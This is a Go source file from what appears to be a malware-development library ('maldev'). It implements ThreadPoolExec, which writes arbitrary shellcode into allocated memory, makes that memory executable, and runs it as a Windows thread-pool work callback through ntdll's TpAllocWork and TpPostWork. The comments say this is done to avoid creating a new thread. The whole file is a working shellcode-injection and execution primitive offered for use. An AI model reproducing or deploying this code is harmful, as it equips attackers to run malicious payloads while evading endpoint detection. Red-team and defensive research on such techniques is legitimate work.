//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// ThreadPoolExec executes shellcode via the current process's thread pool.
// Uses TpAllocWork + TpPostWork + TpReleaseWork from ntdll to schedule
// shellcode as a worker callback on an existing thread pool thread,
// avoiding creation of a new thread.
func ThreadPoolExec(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. Allocate RW memory.
	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("memory allocation failed: %w", err)
	}

	// 2. Copy shellcode.
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)

	// 3. Flip to RX.
	var oldProtect uint32
	if err := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		return fmt.Errorf("memory protection change failed: %w", err)
	}

	// 4. Create a TP_WORK item with the shellcode address as the callback.
	// TpAllocWork(WorkReturn *uintptr, Callback uintptr, Context uintptr, CallbackEnviron uintptr) NTSTATUS
	var work uintptr
	status, _, _ := api.ProcTpAllocWork.Call(
		uintptr(unsafe.Pointer(&work)),
		addr,
		0,
		0,
	)
	if status != 0 {
		return fmt.Errorf("thread pool work allocation failed: NTSTATUS 0x%X", status)
	}

	// 5. Post the work item to the thread pool.
	api.ProcTpPostWork.Call(work)

	// 6. Wait for callback completion, then release.
	// TpWaitForWork(work, cancelPending=FALSE) blocks until the callback finishes.
	// Without this, TpReleaseWork returns immediately and the callback may
	// still be running when the caller's stack frame is gone.
	api.ProcTpWaitForWork.Call(work, 0)
	api.ProcTpReleaseWork.Call(work)

	return nil
}
